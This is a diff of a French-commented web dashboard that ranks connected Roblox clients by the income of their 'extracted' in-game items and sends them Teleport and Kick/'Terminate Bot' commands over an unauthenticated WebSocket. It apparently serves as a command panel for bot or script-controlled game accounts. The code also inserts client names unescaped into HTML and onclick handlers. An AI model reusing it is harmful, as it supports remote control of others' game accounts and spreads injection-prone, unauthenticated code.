@@ -39,6 +39,19 @@
         .scroll-custom::-webkit-scrollbar-thumb { background: #27272a; border-radius: 10px; }
         
         .font-mono-custom { font-family: 'JetBrains Mono', monospace; }
+
+        .input-dark {
+            background: #09090b;
+            border: 1px solid #27272a;
+            color: #f4f4f5;
+            transition: all 0.2s;
+        }
+
+        .input-dark:focus {
+            border-color: #3b82f6;
+            outline: none;
+            ring: 1px solid #3b82f6;
+        }
     </style>
 </head>
 <body class="p-4 md:p-10">
@@ -74,7 +87,6 @@
         let currentFilter = 'all';
         let wsData = [];
 
-        // Gestion de la connexion WebSocket
         const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
         const socket = new WebSocket(`${protocol}://${window.location.host}?role=Admin`);
 
@@ -85,6 +97,39 @@
                 render();
             }
         };
+
+        function sendCommand(targetUser, method, data = {}) {
+            socket.send(JSON.stringify({
+                type: 'COMMAND',
+                target: targetUser,
+                method: method,
+                data: data
+            }));
+            console.log(`Sent ${method} to ${targetUser}`);
+        }
+
+        function handleLinkTeleport(targetUser, inputId) {
+            const input = document.getElementById(inputId);
+            const val = input.value.trim();
+            if(!val) return;
+
+            try {
+                if(val.includes("roblox.com")) {
+                    const url = new URL(val);
+                    const code = url.searchParams.get("code");
+                    if(code) {
+                        sendCommand(targetUser, 'Teleport', { LinkCode: code });
+                        input.value = "";
+                    } else { alert("Code introuvable dans l'URL"); }
+                } else {
+                    // Si ce n'est pas un lien, on traite comme un JobId brut
+                    sendCommand(targetUser, 'Teleport', { JobId: val });
+                    input.value = "";
+                }
+            } catch(e) {
+                alert("Lien ou identifiant invalide");
+            }
+        }
 
         function setFilter(filter) {
             currentFilter = filter;
@@ -98,34 +143,27 @@
             const activeBadge = document.getElementById('active-count');
             container.innerHTML = '';
 
-            // 1. Filtrage (Online / All)
             let filtered = [...wsData];
-            if (currentFilter === 'online') {
-                filtered = filtered.filter(c => c.isConnected);
-            }
-
-            // Mise à jour du compteur
+            if (currentFilter === 'online') filtered = filtered.filter(c => c.isConnected);
             activeBadge.innerText = wsData.filter(c => c.isConnected).length;
 
-            // 2. TRI DES CARTES (La carte avec l'animal le plus cher en premier)
             filtered.sort((a, b) => {
                 const maxA = (a.animals || []).reduce((m, p) => Math.max(m, p.Income || 0), 0);
                 const maxB = (b.animals || []).reduce((m, p) => Math.max(m, p.Income || 0), 0);
                 return maxB - maxA;
             });
 
-            // 3. GÉNÉRATION DU HTML
             if (filtered.length === 0) {
-                container.innerHTML = `<div class="text-center py-10 text-zinc-600">Aucun client trouvé avec ce filtre.</div>`;
+                container.innerHTML = `<div class="text-center py-10 text-zinc-600">Aucun client trouvé.</div>`;
                 return;
             }
 
             filtered.forEach(client => {
-                // Tri des animaux à l'intérieur de la carte (décroissant)
                 const sortedAnimals = (client.animals || []).sort((a, b) => (b.Income || 0) - (a.Income || 0));
+                const inputId = `tele-input-${client.name}`;
                 
                 const card = document.createElement('div');
-                card.className = 'card-bg rounded-2xl overflow-hidden';
+                card.className = 'card-bg rounded-2xl overflow-hidden mb-4';
                 if (client.isConnected) card.style.borderLeft = "4px solid #10b981";
 
                 card.innerHTML = `
@@ -140,37 +178,41 @@
                             <div class="flex flex-col"><span class="text-zinc-600 text-[10px] uppercase font-bold">Display Name</span><span class="font-bold text-zinc-200">${client.displayName}</span></div>
                             <div class="flex flex-col"><span class="text-zinc-600 text-[10px] uppercase font-bold">Username</span><span class="font-bold text-zinc-400">@${client.name}</span></div>
                             <div class="flex flex-col"><span class="text-zinc-600 text-[10px] uppercase font-bold">Account Age</span><span class="font-bold text-zinc-200">${client.accountAge} days</span></div>
-                            <div class="flex flex-col"><span class="text-zinc-600 text-[10px] uppercase font-bold">Server Occupancy</span><span class="font-bold text-zinc-200">${client.server?.playerCount || 0}/${client.server?.maxPlayers || 0}</span></div>
+                            <div class="flex flex-col"><span class="text-zinc-600 text-[10px] uppercase font-bold">Server Occupancy</span><span class="font-bold text-zinc-200">${client.server?.PlayerCount || 0}/${client.server?.MaxPlayers || 0}</span></div>
                         </div>
                     </div>
 
-                    <div class="px-6 py-4 bg-zinc-900/30 flex items-center justify-between">
-                        <div class="flex items-center gap-3">
-                            <div class="w-2.5 h-2.5 rounded-full ${client.isConnected ? 'status-online' : 'status-offline'}"></div>
-                            <span class="text-sm font-bold tracking-tight ${client.isConnected ? 'text-zinc-200' : 'text-zinc-500'}">
-                                ${client.isConnected ? 'CONNECTED TO SOCKET' : 'CONNECTION TERMINATED'}
-                            </span>
+                    <div class="px-6 py-4 bg-zinc-900/20 border-b border-zinc-800/50">
+                        <div class="flex flex-col md:flex-row gap-4 items-center">
+                            <div class="flex-1 w-full">
+                                <label class="text-[9px] font-bold text-zinc-500 uppercase ml-1">Private Server / Share Link</label>
+                                <div class="flex gap-2 mt-1">
+                                    <input id="${inputId}" type="text" placeholder="https://www.roblox.com/share?code=..." 
+                                           class="input-dark w-full px-3 py-2 rounded-lg text-xs font-mono">
+                                    <button onclick="handleLinkTeleport('${client.name}', '${inputId}')" 
+                                            class="bg-zinc-800 hover:bg-zinc-700 px-4 py-2 rounded-lg text-xs font-bold transition">
+                                        Send
+                                    </button>
+                                </div>
+                            </div>
                         </div>
-                        <div class="text-[10px] font-bold text-zinc-600 uppercase">Last Sync: ${new Date(client.updatedAt).toLocaleTimeString()}</div>
                     </div>
 
                     <div class="p-6 bg-black/10">
                         <div class="flex items-center gap-2 mb-5 text-zinc-500 text-[11px] font-black uppercase tracking-[0.2em]">
                             <i data-lucide="zap" class="w-3.5 h-3.5 text-amber-500"></i> Extracted Brainrots
                         </div>
-                        <div class="grid grid-cols-1 gap-2 max-h-72 overflow-y-auto scroll-custom pr-4">
+                        <div class="grid grid-cols-1 gap-2 max-h-48 overflow-y-auto scroll-custom pr-4">
                             ${sortedAnimals.map(a => `
-                                <div class="flex items-center justify-between p-3 rounded-lg bg-zinc-900/40 border border-white/5 hover:border-white/10 transition font-mono-custom group">
+                                <div class="flex items-center justify-between p-3 rounded-lg bg-zinc-900/40 border border-white/5 group">
                                     <div class="flex items-center gap-3">
-                                        <span class="grayscale group-hover:grayscale-0 transition duration-300">😜</span>
                                         <div class="flex flex-col">
-                                            <span class="text-xs text-zinc-500 font-bold uppercase tracking-tighter">${a.Rarity || 'Common'}</span>
+                                            <span class="text-[10px] text-zinc-500 font-bold uppercase">${a.Rarity || 'Common'}</span>
                                             <span class="text-sm text-zinc-200">${a.Mutation !== 'Default' ? `<span class="text-amber-500">[${a.Mutation}]</span> ` : ''}${a.Name}</span>
                                         </div>
                                     </div>
                                     <div class="text-right">
-                                        <div class="text-xs text-zinc-600 font-bold">INCOME</div>
-                                        <div class="text-sm ${(a.Income || 0) > 50000000 ? 'text-emerald-400' : 'text-sky-400'} font-black">${a.IncomeStr}</div>
+                                        <div class="text-sm text-sky-400 font-black">${a.IncomeStr}</div>
                                     </div>
                                 </div>
                             `).join('')}
@@ -178,18 +220,21 @@
                     </div>
 
                     <div class="px-6 py-4 bg-zinc-900/50 flex gap-6 border-t border-zinc-800/50">
-                        <button class="text-[11px] font-black uppercase tracking-widest text-blue-500 hover:text-blue-400 transition">Teleport to Instance</button>
-                        <button class="text-[11px] font-black uppercase tracking-widest text-zinc-600 hover:text-red-500 transition">Force Disconnect</button>
+                        <button onclick="sendCommand('${client.name}', 'Teleport', { JobId: '${client.server?.JobId}' })" 
+                                class="text-[11px] font-black uppercase tracking-widest text-blue-500 hover:text-blue-400 transition flex items-center gap-2">
+                            <i data-lucide="external-link" class="w-3 h-3"></i> Rejoin Current
+                        </button>
+                        <button onclick="sendCommand('${client.name}', 'Kick')" 
+                                class="text-[11px] font-black uppercase tracking-widest text-zinc-600 hover:text-red-500 transition flex items-center gap-2">
+                            <i data-lucide="log-out" class="w-3 h-3"></i> Terminate Bot
+                        </button>
                     </div>
                 `;
                 container.appendChild(card);
             });
-
-            // Re-render des icônes Lucide
             lucide.createIcons();
         }
 
-        // Init initial
         lucide.createIcons();
     </script>
 </body>
